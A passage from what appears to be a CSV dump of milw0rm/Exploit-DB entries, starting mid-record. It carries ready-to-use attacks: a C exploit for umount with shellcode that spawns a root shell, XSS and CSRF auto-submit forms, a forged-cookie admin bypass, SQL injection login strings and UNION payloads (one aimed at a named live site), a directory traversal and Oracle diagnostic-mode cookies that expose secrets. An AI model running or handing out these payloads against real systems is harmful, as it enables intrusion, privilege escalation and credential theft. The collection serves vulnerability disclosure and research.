Shoutz: ~~~~ ~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath ~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke ~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES ~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b ~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c ~ newbie_hacker@yahoogroups.com ~ #aikmel #e-c-h-o @irc.dal.net ~ special for rgod - good bye mate, thanks for the great works. --------------------------------------------------------------------------- Contact: ~~~~~       K-159 || echo|staff || eufrato[at]gmail[dot]com      Homepage: http://k-159.echo.or.id/  -------------------------------- [ EOF ] ----------------------------------  # milw0rm.com [2008-05-05]",PostNuke Module pnEncyclopedia,1
27120,"AZ Bulletin Board 1.0.x/1.1 - 'post.php' HTML Injection source: https://www.securityfocus.com/bid/16351/info  AZbb is prone to HTML-injection vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied input before using it in dynamically generated content.  Attacker-supplied HTML and script code would be executed in the context of the affected website, potentially allowing for the theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.   http://www.example.com/post.php?nickname=""><script>alert('XSS')</script><!--  http://www.example.com/post.php?topic=>""<br><iframe%20src=javascript:alert()><br>""",AZ Bulletin Board,1
6062,"Maian Links 3.1 - Insecure Cookie Handling -[*]+================================================================================+[*]- -[*]+            Maian Links <= v3.1 Insecure Cookie Handling Vulnerability          +[*]- -[*]+================================================================================+[*]-    [*] Discovered By: S.W.A.T. [*] E-Mail: svvateam[at]yahoo[dot]com [*] Script Download: http://www.maianscriptworld.co.uk [*] DORK: Powered by: Maian Links v3.1    [*] Vendor Has Not Been Notified!    [*] DESCRIPTION:     Maian Links suffers from a insecure cookie, the admin panel only checks if the cookie  exists.     and not the content. so we can easyily craft a cookie and look like a admin.    [*] Vulnerability:      javascript:document.cookie = ""links_cookie=1; path=/"";   [*] NOTE/TIP:      after running the javascript, visit ""/admin/index.php"" to view admin area.    -[*]+================================================================================+[*]- -[*]+            Maian Links <= v3.1 Insecure Cookie Handling Vulnerability          +[*]- -[*]+================================================================================+[*]-  # milw0rm.com [2008-07-13]",Maian Links,1
35662,"Noah's Classifieds 5.0.4 - 'index.php' Multiple HTML Injection Vulnerabilities source: https://www.securityfocus.com/bid/47578/info  Noah's Classifieds is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.  <form action=""http://host/index.php"" method=""post"" name=""main"" enctype=""multipart/form-data""> <input type=""hidden"" name=""list"" value=""item""> <input type=""hidden"" name=""method"" value=""create""> <input type=""hidden"" name=""rollid"" value=""2""> <input type=""hidden"" name=""id"" value=""0""> <input type=""hidden"" name=""cid"" value=""2""> <input type=""hidden"" name=""col_16""  value=""""> <input type=""hidden"" name=""col_17"" value=&#039;title""><script>alert(document.cookie)</script>&#039;> <input type=""hidden"" name=""col_18"" value=&#039;<p>description of my""&gt;</p> <script type=""text/javascript"">// <![CDATA[ alert(document.cookie) // ]]></script>&#039;> <input type=""hidden"" name=""col_19"" value=""Pc""> <input type=""hidden"" name=""col_20"" value=""""> <input type=""hidden"" name=""gsubmit"" value=""Ok""> </form> <script> document.main.submit(); </script>  <form action=""http://host/index.php"" method=""post"" name=""main"" enctype=""multipart/form-data""> <input type=""hidden"" name=""list"" value=""appcategory""> <input type=""hidden"" name=""method"" value=""modify""> <input type=""hidden"" name=""rollid"" value=""5""> <input type=""hidden"" name=""id"" value=""5""> <input type=""hidden"" name=""up"" value=""1""> <input type=""hidden"" name=""wholeName"" value=""catitem""> <input type=""hidden"" name=""name"" value=""catitem""> <input type=""hidden"" name=""description"" value=&#039;cat2""><script>alert(document.cookie)</script>&#039;> <input type=""hidden"" name=""picture"" value=""""> <input type=""hidden"" name=""descriptionMeta"" value=""""> <input type=""hidden"" name=""keywords"" value=""""> <input type=""hidden"" name=""customAdMeta"" value=""""> <input type=""hidden"" name=""allowAd"" value=""1""> <input type=""hidden"" name=""immediateAppear"" value=""1""> <input type=""hidden"" name=""inactivateOnModify"" value=""1""> <input type=""hidden"" name=""displayResponseLink"" value=""1""> <input type=""hidden"" name=""displayFriendmailLink"" value=""1""> <input type=""hidden"" name=""displayFlaggedLink"" value=""1""> <input type=""hidden"" name=""customAdListTitle"" value=""""> <input type=""hidden"" name=""customAdListTemplate"" value=""""> <input type=""hidden"" name=""customAdDetailsTemplate"" value=""""> <input type=""hidden"" name=""gsubmit"" value=""Ok""> </form> <script> document.main.submit(); </script>  <form action=""http://host/index.php"" method=""post"" name=""main"" enctype=""multipart/form-data""> <input type=""hidden"" name=""list"" value=""appsettings""> <input type=""hidden"" name=""method"" value=""modify""> <input type=""hidden"" name=""rollid"" value=""1""> <input type=""hidden"" name=""id"" value=""1""> <input type=""hidden"" name=""defaultTheme"" value=""modern""> <input type=""hidden"" name=""defaultLanguage"" value=""en""> <input type=""hidden"" name=""langDir"" value=""ltr""> <input type=""hidden"" name=""adminEmail"" value=""""> <input type=""hidden"" name=""titlePrefix"" value=&#039;[Noahs Classifieds]</title><script>alert(document.cookie)</script>&#039;> <input type=""hidden"" name=""mainTitle"" value=""""> <input type=""hidden"" name=""charLimit"" value=""0""> <input type=""hidden"" name=""blockSize"" value=""20""> <input type=""hidden"" name=""dateFormat"" value=""Y-m-d""> <input type=""hidden"" name=""timeFormat"" value=""Y-m-d H:i""> <input type=""hidden"" name=""gsubmit"" value=""Ok"">  </form> <script> document.main.submit(); </script>",Noah's Classifieds,1
8392,"Chance-i DiViS DVR System Web-Server - Directory Traversal Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-036  original advisory: http://dsecrg.com/pages/vul/DSECRG-09-036.html  Application:                Chance-i DiViS DVR System web-server Versions Affected:          2.0 Vendor URL:                 http://www.chance-i.com/ Bug:                        Directory Traversal File Download Exploits:                   YES Reported:                   13.03.2009 Second Reported:            20.03.2009 Solution:                   NONE Date of Public Advisory:    09.04.2009 Author:                     Digital Security Research Group [DSecRG] (research [at] dsecrg [dot] com)    Description ***********  DiViS DVR System web-server which fingerprints as Techno Vision Security System has Directory Traversal vulnerability.    Details *******  Directory traversal vulnerability find in DiViS DVR System web-server.  Successfully exploiting these issues allows remote attackers to access the contents of arbitrary files.  Example:  http://[server]/../../../../../../../boot.ini    Solution: *********  We did not get any response from vendor for more than 2 weeks.  No patches aviable.    About *****  Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.   Contact:    research [at] dsecrg [dot] com             http://www.dsecrg.com             http://www.dsec.ru  # milw0rm.com [2009-04-10]",Chance-i DiViS DVR System Web-Server,1
321,"BSD / Linux - 'umount' Local Privilege Escalation /* Reminder - Be sure to fix the includes /str0ke */ -------------------------------------- linux_umount_exploit.c ---------- #include  #include  #include  #include  #include  #include   #define PATH_MOUNT ""/bin/umount"" #define BUFFER_SIZE 1024 #define DEFAULT_OFFSET 50  u_long get_esp() {   __asm__(""movl %esp, %eax"");  }  main(int argc, char **argv) {   u_char execshell[] =    ""\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f""    ""\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd""    ""\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh"";     char *buff = NULL;    unsigned long *addr_ptr = NULL;    char *ptr = NULL;     int i;    int ofs = DEFAULT_OFFSET;     buff = malloc(4096);    if(!buff)    {       printf(""can't allocate memory\n"");       exit(0);    }    ptr = buff;     /* fill start of buffer with nops */     memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));    ptr += BUFFER_SIZE-strlen(execshell);     /* stick asm code into the buffer */     for(i=0;i < strlen(execshell);i++)       *(ptr++) = execshell[i];     addr_ptr = (long *)ptr;    for(i=0;i < (8/4);i++)       *(addr_ptr++) = get_esp() + ofs;    ptr = (char *)addr_ptr;    *ptr = 0;     (void)alarm((u_int)0);    execl(PATH_MOUNT, ""umount"", buff, NULL); }   // milw0rm.com [1996-08-13]",BSD / Linux,1
34344,"Pre Jobo.NET - Multiple SQL Injections source: https://www.securityfocus.com/bid/41747/info  Pre Jobo.NET is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   The following example data is available:  User : 1'or'1'='1 Pass : 1'or'1'='1",Pre Jobo.NET,1
24158,"Oracle Application Framework - Diagnostic Mode Bypass Trustwave SpiderLabs Security Advisory TWSL2012-023: Oracle Application Framework Diagnostic Mode Bypass Vulnerability  Published: 1/15/2013 Version: 1.0  Vendor: Oracle (www.oracle.com) Product: Oracle Application Framework  Version affected: 11.5.10.2, 12.0.6, 12.1.3  Product description: The Oracle Application Framework is a Java library used to facilitate the development of web-based applications.  Credit: David Byrne of Trustwave SpiderLabs  Finding 1: Oracle Application Framework Diagnostic Mode Bypass Vulnerability CVE: CVE-2013-0397  The Oracle Application Framework supports a diagnostic and developer mode feature that are intended to be enabled from developer or administrative interfaces. However, any user can manually enable the modes by setting the ""OADiagnostic"" or ""OADeveloperMode"" cookies to ""1"".  Example: GET request for enabling diagnostic mode  GET /OA_HTML/RF.jsp?function_id=1038712&resp_id=23350&resp_appl_id=80 0&security_group_id=0&lang_code=US&params=.1VlTZi5hyKHcE3E6mrZaB91phg4LLW-2ZXXJFOuaJdg-6ALqWl2AqDOwJZdQVEM&oas=q5-BOVjQj7_z-XSTMTne3A..  HTTP/1.1 Host: A.B.C.D User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:16.0) Gecko/20100101 Firefox/16.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Cookie: JSESSIONID=b2f1079e3d1bb96cb4bd465a829d42ee397609177b2c4e281fb 7d1235f1153b2.e3ePbhaKb3qRe3yMb3aMaxiKay0; OADiagnostic=1; GSI=ZYAdeA07tN9SSQS8jeBDZGoXK9;  BIGipServergsiap_irecruitment_http=1527616141.5150.0000; s_cc=true; s_nr=1351286855771; gpv_p24=no%20value;  gpw_e24=no%20value; s_sq=%5B%5BB%5D%5D; OADeveloperMode=1; oracle.uix=0^^GMT-6:00^p;  fs_nocache_guid=06D4170AC1745B5E87EA9290121EFF01; atgPlatoStop=1  Enabling diagnostic mode causes the server to present a ""Diagnostics"" link at the top and bottom of every page, and an ""About this page"" link at the bottom. This can be performed on pages that do not require authentication.  For example, clicking on the ""Diagnostics"" link allows the user to enable a number of tracing and logging functions. Clicking on ""About this page"" presents environment and session information. The ""profiles"" tab in the ""About this page"" section allows access to a number of sensitive settings, including passwords and encryption/decryption keys.  Remediation Steps: The vendor has addressed this security issue in the January 2013 Critical Patch Update.  Vendor Communication Timeline: 10/31/12 - Initial communications with vendor 11/01/12 - Vulnerability disclosed to vendor 11/05/12 - Vendor acknowledges security issue 11/27/12 - Vendor provides status report 12/17/12 - Vendor provides status report 01/09/13 - Consulted vendor about publishing advisory 01/11/13 - Acknowledged publishing fix for January 15th CPU 01/15/13 - Advisory published  About Trustwave: Trustwave is the leading provider of on-demand and subscription-based information security and payment card industry compliance management solutions to businesses and government entities throughout the world. For organizations faced with today's challenging data security and compliance environment, Trustwave provides a unique approach with comprehensive solutions that include its flagship TrustKeeper compliance management software and other proprietary security solutions. Trustwave has helped thousands of organizations--ranging from Fortune 500 businesses and large financial institutions to small and medium-sized retailers--manage compliance and secure their network infrastructure, data communications and critical information assets. Trustwave is headquartered in Chicago with offices throughout North America, South America, Europe, Africa, China and Australia. For more information, visit https://www.trustwave.com  About Trustwave SpiderLabs: SpiderLabs(R) is the advanced security team at Trustwave focused on application security, incident response, penetration testing, physical security and security research. The team has performed over a thousand incident investigations, thousands of penetration tests and hundreds of application security tests globally. In addition, the SpiderLabs Research team provides intelligence through bleeding-edge research and proof of concept tool development to enhance Trustwave's products and services. https://www.trustwave.com/spiderlabs  Disclaimer: The information provided in this advisory is provided ""as is"" without warranty of any kind. Trustwave disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Trustwave or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Trustwave or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.  ________________________________  This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under  applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying,  distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If  you received this transmission in error, please immediately contact the sender and destroy the material in its  entirety, whether in electronic or hard copy format.",Oracle Application Framework,1
7133,"FloSites Blog - Multiple SQL Injections =========================================================================================== [-] Title    : Multiple SQL Injection Vulnerability [-] Software : Flosites Blog [-] Vendor   : www.flosites.com [-] Date     : 17 November 2008 (Indonesia) [-] Author   : Vrs-hCk [-] Contact  : d00r[at]telkom.net [-] Blog     : http://c0li.blogspot.com/ ===========================================================================================  [+] Google Dork      ""blog by flosites""  [+] Exploit      http://[site]/[path]/index.php?cat=-1 [SQL]/*     http://[site]/[path]/index.php?category=-1 [SQL]/*  [+] Proof of Concept      http://www.designaglow.com/blog/index.php?cat=-1+union+select+1,version(),3/*     http://www.designaglow.com/blog/index.php?category=-1+union+select+1,version(),3/*  =========================================================================================== [-] Greetz   :      www.MainHack.com - www.ServerIsDown.org - #papuahacker crew - #nob0dy Crew @ DALnet     Paman, NoGe, OoN_Boy, H312Y, pizzyroot, xx_user, bL4Ck_3n91n3, culun_borneo, s3t4n,     Angela Chang, terbang_melayang, IrcMafia, loqsa, str0ke, em|nem, dkk ... ===========================================================================================  # milw0rm.com [2008-11-16]",FloSites Blog,1
